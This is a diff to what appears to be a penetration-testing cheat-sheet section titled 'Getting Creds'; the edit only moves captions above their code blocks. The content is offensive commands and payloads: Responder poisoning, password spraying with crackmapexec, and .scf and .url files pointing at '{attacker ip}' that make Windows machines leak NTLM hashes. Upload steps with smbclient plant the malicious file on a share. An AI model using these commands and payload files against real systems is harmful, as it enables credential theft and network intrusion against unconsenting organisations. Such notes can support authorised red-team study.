@@ -1,7 +1,7 @@
 ## Getting Creds
 * `responder -I eth0 -wrf` _Start responder on eth0. Listen for netbios, and wpad_
 * `crackmapexec smb {ip} -u {users.txt} -p {password}` _spray all user accounts in users.txt with a single popular password_
-
+* _Example index.scf file that can force any machine that views a share to send hash to attackers responder_
 ```
 [Shell]
 Command=1
@@ -9,13 +9,12 @@ IconFile=\\{attacker ip}\whatever.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-_Example index.scf file that can force any machine that views a share to send hash to attackers responder_
 
+_Example .url file that when clicked will send hash to attackers responder_
 ```
 [InternetShortcut]
 URL=file://{attacker ip}/@whatever
 ```
-_Example .url file that when clicked will send hash to attackers responder_
 
 * `smbclient \\\\{ip}\\{share name} -U {domain}/{user}` _connect to smb share with valid creds_
 * `put /{path}/index.scf ./index.scf` _upload malicous scf file to root of connected smb share_
